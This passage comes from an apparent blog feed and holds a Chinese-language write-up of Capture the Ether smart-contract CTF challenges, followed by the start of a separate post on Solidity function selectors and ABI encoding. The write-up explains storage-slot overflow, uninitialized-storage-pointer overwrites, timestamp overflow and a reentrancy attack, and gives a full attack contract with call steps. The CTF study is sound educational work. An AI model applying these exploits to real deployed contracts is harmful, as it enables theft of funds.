get(uint256 key) public view returns (uint256) &#123;</span><br><span class="line">        return map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目中判断是否完成的<code>isComplete</code>是一个布尔类型的变量，由于在该合约中没有改变其状态的函数，可以联想通过<code>storage</code>覆盖的方式，改变<code>isComplete</code>的值，只要写入数据就会变成 <strong>true。</strong></p><p>这个合约中只有俩个状态变量，而以太坊的 storage 中对于uint、mapping类型变量在不赋值的情况下会被初始化为 0，占用一个 slot（uint8 = uint256），对于struct对象，没有实例化的话不会占用slot，所以对于该合约这俩个变量的排列规则是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------</span><br><span class="line">|          unused(31)          ｜  isComplete(1)  | &lt;- slot 0</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                 map.length                      | &lt;- slot 1</span><br><span class="line">---------------------------------------------------</span><br><span class="line">// ...</span><br><span class="line">slot keccak(1): map[0]</span><br><span class="line">slot keccak(1) + 1: map[1]</span><br><span class="line">slot keccak(1) + 2: map[2]</span><br><span class="line">slot keccak(1) + 3: map[3]</span><br><span class="line">slot keccak(1) + 4: map[4]</span><br><span class="line">// ...</span><br></pre></td></tr></table></figure><p>由存储结构可以联想到利用<code>map.length</code>的长度造成上溢，使<code>isComplete</code>变成true。即插槽 slot 1保存的是动态数组<code>map[]</code>的大小，该插槽的<code>keccak256</code>作为存储值的地址，如果可以以某种方式扩展该数组的边界使其覆盖掉<code>isComplete</code>的存储插槽，只要能找到写到哪个地址就可以访问并覆盖掉<code>isComplete</code>的值。</p><ol><li><p>计算需要访问哪个地址才能访问到<code>isComplete</code>，即访问到 slot 0；</p></li><li><p>计算<code>map[]</code>数组开始的地址，动态数组的第一个元素的位置计算公式为:<code>keccak256(bytes32(position))</code>,<code>map[]</code>数组的 position 为 slot 1，所以起始位置为<code>keccak256(bytes32(1))</code>，即<code>0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</code>;</p></li><li><p>由<code>map[]</code>数组中任意一个动态数组内的元素所在位置的计算公式为：<code>slot keccak(1) + map[index]</code>，所以要使 slot 的 key 值越界到 0 就可以控制 slot 1 的value，所以需要<code>keccak + index == 2^256</code>，所以 index 为：<code>35707666377435648211887908874984608119992236509074197713628505308453184860938</code>,即<code>map[]</code>数组在这个位置的变量会发生越界，且其值可以覆盖 map.length 的值。</p><p>计算方法：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span>**<span class="number">256</span> - <span class="built_in">int</span>(<span class="number">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span>)</span><br></pre></td></tr></table></figure></li><li><p>调用函数<code>set(key, value)</code>，key 为刚才计算的 index，value 为任意正数</p><p><img src="/image/capturetheether.assets/image-20220325170933550.png" alt="image-20220325170933550"></p></li></ol><h3 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">    struct Donation &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    Donation[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function DonationChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        </span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">        // amount is in ether, but msg.value is in wei</span><br><span class="line">        uint256 scale = 10**18 * 1 ether;</span><br><span class="line">        require(msg.value == etherAmount / scale);</span><br><span class="line"></span><br><span class="line">        Donation donation;</span><br><span class="line">        donation.timestamp = now;</span><br><span class="line">        donation.etherAmount = etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.push(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        </span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题完成的条件是合约中的余额为 0 ，在构造函数中合约被转入了 1 ether，所以这道题就是要把这 1 ether 转出，只有在 <code>withdraw</code>函数中存在 <strong>transfer</strong> 方法，但是要求<code>msg.sender == owner</code>，目前 owner 在构造函数中被赋值，所以这道题的思路就是把 owner 的 slot 覆盖。</p><p>以太坊的 storage 中对于uint、mapping类型变量在不赋值的情况下会被初始化为 0，占用一个 slot（uint8 = uint256），对于struct对象，没有实例化的话不会占用slot，在这道题中，对结构体以及结构体数组均为赋初始值，所以存在未初始化的存储指针漏洞，storage 里的存储布局如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------------------------</span><br><span class="line">|              Donation.length                | &lt;- slot 0</span><br><span class="line">-----------------------------------------------</span><br><span class="line">|    unused(12   |        owner(20)           | &lt;- slot 1</span><br><span class="line">-----------------------------------------------</span><br><span class="line">|                 .............               | </span><br><span class="line">-----------------------------------------------</span><br></pre></td></tr></table></figure><p><code>timestamp</code>处传入的参数永远为 now ，只有<code>etherAmount</code>参数可控，由于是通过 push 给 动态数组<code>Donations</code>增加元素，所以无法将slot 地址上溢为 1。</p><p>这里需要利用 solidity 低版本特性，**<font color=red>struct 不赋值不会默认初始化，即结构体不赋值不会占用slot，由于结构体在函数内非显示地初始化时会使用storage存储而不是memory，所以可以达到变量覆盖的效果。</font>**</p><p>参考：<a href="http://www.freebuf.com/articles/blockchain-articles/175237.html">Solidity中存储方式错误使用所导致的变量覆盖</a></p><p>所以当<code>timestamp和etherAmount</code>在函数中初始化时会覆盖掉 slot 0 和 slot 1，如果让<code>etherAmount</code>传入自己的地址，就可以覆盖 owner，通过<code>require(msg.sender == owner);</code>检查。这里需要计算<code>msg.value</code>，因为<code>msg.value == etherAmount / scale ，scale = 10**18</code>，所以传入的 <code>value = etherAmount / 10**18/10**18</code>，然后调用<code>donate()</code>函数。</p><h3 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract FiftyYearsChallenge &#123;</span><br><span class="line">    struct Contribution &#123;</span><br><span class="line">        uint256 amount;</span><br><span class="line">        uint256 unlockTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line">    Contribution[] queue;</span><br><span class="line">    uint256 head;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    function FiftyYearsChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        owner = player;</span><br><span class="line">        queue.push(Contribution(msg.value, now + 50 years));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upsert(uint256 index, uint256 timestamp) public payable &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;</span><br><span class="line">            // Update existing contribution amount without updating timestamp.</span><br><span class="line">            Contribution storage contribution = queue[index];</span><br><span class="line">            contribution.amount += msg.value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // Append a new contribution. Require that each contribution unlock</span><br><span class="line">            // at least 1 day after the previous one.</span><br><span class="line">            require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);</span><br><span class="line"></span><br><span class="line">            contribution.amount = msg.value;</span><br><span class="line">            contribution.unlockTimestamp = timestamp;</span><br><span class="line">            queue.push(contribution);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 index) public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        require(now &gt;= queue[index].unlockTimestamp);</span><br><span class="line"></span><br><span class="line">        // Withdraw this and any earlier contributions.</span><br><span class="line">        uint256 total = 0;</span><br><span class="line">        for (uint256 i = head; i &lt;= index; i++) &#123;</span><br><span class="line">            total += queue[i].amount;</span><br><span class="line"></span><br><span class="line">            // Reclaim storage.</span><br><span class="line">            delete queue[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Move the head of the queue forward so we don&#x27;t have to loop over</span><br><span class="line">        // already-withdrawn contributions.</span><br><span class="line">        head = index + 1;</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(total);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Fifty years 综合考察了 math 系列的知识点，完成挑战的条件是将合约中的钱全部转出。</p><ol><li><p>调用 withdraw 函数中的 transfer 方法可以将合约中的钱全部转出，调用 withdraw 时需要<code>withdraw(queue.lengtht - 1)</code>，即取最后一笔的时候会把之前的存款加起来一次性取出；</p></li><li><p>执行 withdraw 函数时需要满足<code>require(now &gt;= queue[index].unlockTimestamp)</code>，在构造函数中的结构体数组的第一个元素为 <code>now + 50 years</code>，后面每一次插入新元素解锁时间都会再加一天，所以 now 至少应该大于50年以后；</p></li><li><p>所以如果要调用 transfer 方法就需要绕过 timestamp 的检查，由于 storage 中的存储布局如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------</span><br><span class="line">|                    queue.length                 | &lt;- slot 0</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      head                       | &lt;- slot 1</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      owner                      | &lt;- slot 2</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      ......                     | </span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      msg.value                  | &lt;- slot keccak256(0)</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                    now + 50 year                | &lt;- slot keccak256(0) + 1</span><br><span class="line">---------------------------------------------------</span><br></pre></td></tr></table></figure><p>根据存储布局分析，在 upsert 中构造溢出，利用未初始化存储指针漏洞，当 struct 未被赋初值时不占用 slot，在upsert 函数中被赋值后会覆盖 <code>queue.length 和 head</code>，即 覆盖掉 slot 0 和 slot 1，即最终的存储结构为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------</span><br><span class="line">|       contribution.amount = msg.value           | &lt;- slot 0</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|    contribution.unlockTimestamp = timestamp     | &lt;- slot 1</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      owner                      | &lt;- slot 2</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      ......                     | </span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                      msg.value                  | &lt;- slot keccak256(0)</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                    now + 50 year                | &lt;- slot keccak256(0) + 1</span><br><span class="line">---------------------------------------------------</span><br></pre></td></tr></table></figure><p>被覆盖以后会改变<code>queue[head]</code>的值，即覆盖掉<code>queue[0].unlockTimestamp</code>。</p></li><li><p>在<code>upset()</code>函数中的 if 语句的<code>upset(0, timestamp)</code>不会改变 timestamp，只会更新 amount，只有当<code>timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days</code>时才会执行 else 语句，如果能使<code>queue[queue.length - 1].unlockTimestamp == 2**256 - 1</code>，就会造成上溢出，加上后边的 1，就等于 0 了，然后将 <code>timestamp = 0</code>传入，绕过 <code>withdraw()</code>函数的 require 要求。</p></li></ol><p>解题步骤：</p><ol><li><p>调用 <code>upsert()</code>函数 将 index，timestamp 参数分别设置为<code>1, 2**256 -1</code>，由于在代码中的 1 应该是以为妙为单位，所以这里需要进行单位转换，<code>1 day =  24*60*60=86400s</code>，构造溢出 <code>timestamp = queue[queue.length - 1].unlockTimestamp + 1 days </code>，即<code>queue[queue.length - 1].unlockTimestamp + 86400 = 2**256</code>，所以需要传入的参数为 115792089237316195423570985008687907853269984665640564039457584007913129553536</p><p><img src="/image/capturetheether.assets/image-20220326222312412.png" alt="image-20220326222312412"></p><p>会将<code>queue.length ，head</code>分别覆盖为<code>1,115792089237316195423570985008687907853269984665640564039457584007913129553536</code></p></li><li><p>调用 <code>upsert()</code>函数 将 index，timestamp 参数分别设置为<code>2, 0</code>,此时<code>queue.length，head</code>分别被覆盖为<code>2,0</code>，timestamp + 1 后溢出为 0，绕过<code>timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days</code>判断，所以现在绕过 withdraw 限制；</p></li><li><p>调用函数 <code>withdraw(1)</code>，只需要取出 index 1之前的即可。</p></li></ol><h3 id="Assume-ownership"><a href="#Assume-ownership" class="headerlink" title="Assume ownership"></a>Assume ownership</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AssumeOwnershipChallenge &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function AssumeOwmershipChallenge() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>杂项的第一道题比较简单，只需要先调用<code>AssumeOwmershipChalleng</code>函数成为 owner，然后再调用<code>authenticate</code>函数就可以完成题目。</p><h3 id="Token-Bank"><a href="#Token-Bank" class="headerlink" title="Token Bank"></a>Token Bank</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface ITokenReceiver &#123;</span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleERC223Token &#123;</span><br><span class="line">    // Track how many tokens are owned by each address.</span><br><span class="line">    mapping (address =&gt; uint256) public balanceOf;</span><br><span class="line">    string public name = &quot;Simple ERC223 Token&quot;;</span><br><span class="line">    string public symbol = &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals = 18;</span><br><span class="line">    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">    function SimpleERC223Token() public &#123;</span><br><span class="line">        balanceOf[msg.sender] = totalSupply;</span><br><span class="line">        emit Transfer(address(0), msg.sender, totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line">    function isContract(address _addr) private view returns (bool is_contract) &#123;</span><br><span class="line">        uint length;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            //retrieve the size of the code on target address, this needs assembly</span><br><span class="line">            length := extcodesize(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        return length &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function transfer(address to, uint256 value) public returns (bool success) &#123;</span><br><span class="line">        bytes memory empty;</span><br><span class="line">        return transfer(to, value, empty);</span><br><span class="line">    &#125;</span><br><span class="line">    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">        if (isContract(to)) &#123;</span><br><span class="line">            ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line">    function approve(address spender, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function transferFrom(address from, address to, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        require(value &lt;= balanceOf[from]);</span><br><span class="line">        require(value &lt;= allowance[from][msg.sender]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        emit Transfer(from, to, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TokenBankChallenge &#123;</span><br><span class="line">    SimpleERC223Token public token;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    function TokenBankChallenge(address player) public &#123;</span><br><span class="line">        token = new SimpleERC223Token();</span><br><span class="line"></span><br><span class="line">        // Divide up the 1,000,000 tokens, which are all initially assigned to</span><br><span class="line">        // the token contract&#x27;s creator (this contract).</span><br><span class="line">        balanceOf[msg.sender] = 500000 * 10**18;  // half for me</span><br><span class="line">        balanceOf[player] = 500000 * 10**18;      // half for you</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return token.balanceOf(this) == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">        require(msg.sender == address(token));</span><br><span class="line">        require(balanceOf[from] + value &gt;= balanceOf[from]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] += value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= amount);</span><br><span class="line"></span><br><span class="line">        require(token.transfer(msg.sender, amount));</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>杂项的第二道题， TokenBankChallenge 合约就相当于一个银行，玩家一开始会有 500000 eth 的余额，可以通过 withdraw 使用这部分余额购买使用 SimpleERC223Token 实现的 Token，银行持有的 Token 为 1000000 ether，通过该题目的条件是让银行合约持有的 Token 清零。</p><p>注意代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isContract(to)) &#123;</span><br><span class="line">            ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这里判断 to 地址是否为合约地址，如果是合约地址的话就用 ITokenReceiver 接口来调用 to 合约的 tokenFallback 函数，tokenFallback 函数回更改目标的 balance，但是由于这里的 to 地址可控，所以存在 <strong>任意外部调用类型漏洞</strong>，只需要在攻击合约中命令一个 tokenFallback 函数，就可以在 transfer 的执行过程中额外调用攻击合约的函数，又因为在 withdraw 函数中 对 <code>token.transfer</code>的调用在 require 函数中，所以这里还存在重入漏洞。</p><p>整个的攻击思路为：</p><p>​    部署一个攻击合约，将 player 的 Token 转让给这个合约，攻击合约再把 Token 转化为银行的 balance，可以以合约身份执行 withdraw 函数，触发重入。</p><p>调用<code>token.transfer</code>函数后余额会更新，允许重复提取存入的资金，重入的控制流程是：<code>challenge.withdraw =&gt; token.transfer =&gt; msg.sender.tokenFallback() =&gt; ... repeat until empty</code></p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    address addr_TokenBankChallenge = 0xD8555E9A128C07928C1429D834640372C8381828;</span><br><span class="line">    address addr_SimpleERC223Token  = 0x8D8ACb16e0FAec90e078123FAfa0F2a7e759B556;</span><br><span class="line">    TokenBankChallenge TokenBank;</span><br><span class="line">    SimpleERC223Token SimpleERC223;</span><br><span class="line">    uint256 check;</span><br><span class="line">    function Attack() payable&#123;</span><br><span class="line">        TokenBank = TokenBankChallenge(addr_TokenBankChallenge);</span><br><span class="line">        SimpleERC223 = SimpleERC223Token(addr_SimpleERC223Token);</span><br><span class="line">    &#125;</span><br><span class="line">    function action1() public &#123;</span><br><span class="line">        SimpleERC223.transferFrom(0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB,address(this),500000000000000000000000);</span><br><span class="line">    &#125;</span><br><span class="line">    function action2() public &#123;</span><br><span class="line"></span><br><span class="line">        SimpleERC223.transfer(addr_TokenBankChallenge,500000000000000000000000);</span><br><span class="line">    &#125;</span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes) public &#123;</span><br><span class="line">        check=check+1;</span><br><span class="line">        if(check &lt;= 2)&#123;</span><br><span class="line">        TokenBank.withdraw(500000 * 10**18);    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>初始 player 的账户的余额为：<code>500000000000000000000000</code>，首先调用 withdraw 函数把 player 的余额全部转换成 SimpleERC223Token 中的 token<img src="/Users/banana69/blog/ctf/capturetheether.assets/image-20220401151218782.png" alt="image-20220401151218782"></p><p><img src="/image/capturetheether.assets/image-20220401151306973.png" alt="image-20220401151306973"></p></li><li><p>然后再调用 <code>SimpleERC223Token</code>合约中的 approve 函数，授权攻击合约可以使用所有的 token</p><p> <img src="/image/capturetheether.assets/image-20220401151456754.png" alt="image-20220401151456754"></p></li><li><p>调用攻击合约中的 action1 将原本 player 的 token  转移到智能合约的账户中</p><p> <img src="/image/capturetheether.assets/image-20220401151844688.png" alt="image-20220401151844688"></p><p> <img src="/image/capturetheether.assets/image-20220401151852050.png" alt="image-20220401151852050"></p></li></ol><ol start="4"><li><p>然后调用攻击合约中的 action2 ，即调用 transfer 函数向 <code>TokenBankChallenge</code> 合约将 token 转为 balance，但是由于在 transfer 函数中会判断转入的地址是否为合约地址，如果为合约地址的话会将 balance 退回到发起转账的账户，即退回到了攻击合约中，此时攻击合约的余额为<code>500000000000000000000000</code></p><p> <img src="/image/capturetheether.assets/image-20220401153046304.png" alt="image-20220401153046304"></p><p> <img src="/image/capturetheether.assets/image-20220401153107117.png" alt="image-20220401153107117"></p></li><li><p>最后调用攻击合约中的 tokenFallback 函数（参数任意），该函数中会调用 <code>TokenBankChallenge</code> 合约中的 withdraw 函数，而在 withdraw 函数中又会执行 <code>token.transfer(msg.sender，amount)</code>，且对余额的更新在执行 transfer 之后，所以这里就会造成重入漏洞，且在执行 transfer 时，<code>address to</code> 是一个可控的变量，为攻击合约的地址，在攻击合约中可以定义 tokenFallback 函数，当判断到地址 to 为合约地址时就会重入调用攻击合约中的 tokenFallback 函数，这里的 check 为控制 withdraw 函数执行俩次就可以将合约中的balance清零。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Guess-the-secret-number&quot;&gt;&lt;a href=&quot;#Guess-the-secret-number&quot; class=&quot;headerlink&quot; title=&quot;Guess the secret number&quot;&gt;&lt;/a&gt;Guess the secret </summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>Solidity函数选择器与参数编码</title>
    <link href="https://banana69.site/2021/10/17/Solidity%20Function%20Selector/"/>
    <id>https://banana69.site/2021/10/17/Solidity%20Function%20Selector/</id>
    <published>2021-10-17T07:21:46.000Z</published>
    <updated>2022-07-28T06:41:27.781Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-Basic-Design"><a href="#0x01-Basic-Design" class="headerlink" title="0x01 Basic Design"></a>0x01 Basic Design</h4><p><strong>ABI (Application Binary Interface，应用二进制接口)</strong> 是以太坊生态系统中从区块链外部与合约进行交互以及合约间进行交互的一种方式。数据会根据其类型按照这份手册中说明的方法进行编码。</p><p>通常，ABI 是俩个程序模块之间的接口，其中之一通常处于机器代码级别，接口是将数据编码/解码到机器代码中(从机器代码中解码出来)的方法。在以太坊中，它是如何编码 Solidity 合约调用以及如何从交易中读取数据的基础。</p><h4 id="0x02-Function-Selector"><a href="#0x02-Function-Selector" class="headerlink" title="0x02 Function Selector"></a>0x02 Function Selector</h4><p>为了能够在以太坊上部署智能合约，合约函数被编译成 <strong>EVM</strong> 字节码，并添加了一段称为函数选择器的代码，作为合约代码的入口点。</p><p>一个函数调用数据的前 <strong>4</strong> 字节，指定了要调用的函数。这就是某个函数签名的 <strong>Keccak</strong> 哈希的前 4 字节（高位在左的大端序）。例如，<code>bytes4(keccak256(&#39;balanceOf(address)&#39;)) == 0x70a08231</code> 这种形式，<code>0x70a08231</code> 便是<code>balanceOf(address)</code>的 <strong>Function Selector</strong>。</p><ul><li>基础原型即是函数名称加上由括号括起来的参数类型列表，参数类型间由一个逗号分隔开，且没有空格；</li><li>对于 <strong>uint</strong> 类型，要转成 <strong>uint256</strong> 进行计算，比如 <code>ownerOf(uint256)</code> 其 <strong>Function Selector =</strong> <code>bytes4(keccak256(&#39;ownerOf(uint256)&#39;)) == 0x6352211e</code>；</li><li>函数参数包含结构体，相当于把结构体拆分成单个参数，只不过这些参数用 <code>()</code> 扩起来，详细可看下面的例子。</li></ul><p>给出以下例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.16 &lt;0.9.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">contract Demo &#123;</span><br><span class="line">    struct Test &#123;</span><br><span class="line">        string name;</span><br><span class="line">        string policies;</span><br><span class="line">        uint num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint public x;</span><br><span class="line">    function test1(bytes3) public &#123;x = 1;&#125;</span><br><span class="line">    function test2(bytes3[2] memory) public  &#123; x = 1; &#125;</span><br><span class="line">    function test3(uint32 x, bool y) public  &#123; x = 1; &#125;</span><br><span class="line">    function test4(uint, uint32[] memory, bytes10, bytes memory) public &#123; x = 1; &#125;</span><br><span class="line">    function test5(uint, Test memory test) public &#123; x = 1; &#125;</span><br><span class="line">    function test6(uint, Test[] memory tests) public &#123; x = 1; &#125;</span><br><span class="line">    function test7(uint[][] memory,string[] memory) public &#123; x = 1; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* 函数选择器</span><br><span class="line">&#123;</span><br><span class="line">    &quot;0d2032f1&quot;: &quot;test1(bytes3)&quot;,</span><br><span class="line">    &quot;2b231dad&quot;: &quot;test2(bytes3[2])&quot;,</span><br><span class="line">    &quot;92e92919&quot;: &quot;test3(uint32,bool)&quot;,</span><br><span class="line">    &quot;4d189ce2&quot;: &quot;test4(uint256,uint32[],bytes10,bytes)&quot;,</span><br><span class="line">    &quot;4ca373dc&quot;: &quot;test5(uint256,(string,string,uint256))&quot;,</span><br><span class="line">    &quot;ccc5bdd2&quot;: &quot;test6(uint256,(string,string,uint256)[])&quot;,</span><br><span class="line">    &quot;cc80bc65&quot;: &quot;test7(uint256[][],string[])&quot;,</span><br><span class="line">    &quot;0c55699c&quot;: &quot;x()&quot;</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//计算函数选择器</span><br><span class="line">function selector() public view returns (bytes4) &#123;</span><br><span class="line">return this.test1.selector;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="0x03-Argument-Encoding"><a href="#0x03-Argument-Encoding" class="headerlink" title="0x03 Argument Encoding"></a>0x03 Argument Encoding</h4><p>从第 <strong>5</strong> 个字节开始是被编码的参数。这种编码也被用在其他地方，比如，返回值和事件的参数也会被用同样的方式进行编码，而用来指定函数的 <strong>4</strong> 个字节则不需要再进行编码。</p><ul><li><p>基础类型：</p><ul><li><p><code>uint&lt; M &gt;</code> ： M 位的无符号整数，0 &lt; M &lt;= 256、M % 8 == 0；</p></li><li><p><code>int&lt; M &gt;</code>：以 2 为补码作为符号的 M 位整数，0 &lt; M &lt;= 256、M % 8 ==0；</p></li><li><p><code>address</code>：除了表示地址类型外，还等价于 uint160，在计算和函数选择器中通常使用 address；</p></li><li><p><code>bool</code>：等价于 uint8，取值为 0 或 1，在计算和函数选择器中通常使用 bool；</p></li><li><p><code>ixed&lt; M &gt;x&lt; N &gt;</code>：M 位的有符号固定小数位的是十进制数字，8 &lt;= M &lt;= 256、M % 8 == 0、且 0 &lt; N &lt;= 80，</p></li><li><p><code>fixed、ufixed</code>：fixed128x18 和 ufixed128x18 的同义词，在计算和函数选择器中通常使用 fixed128x18 和 ufixed128x18；</p></li><li><p><code>bytes&lt; M &gt;</code>：M 字节的二进制类型，0 &lt; M &lt;= 32；</p></li><li><p><code>function</code>：一个地址（20字节）后跟一个函数选择器（4字节），编码之后等价于bytes24.</p></li></ul></li><li><p>定长数组类型：</p><p><code>&lt; type &gt;[M]</code>：有 M 个元素的定长数组，M &gt;= 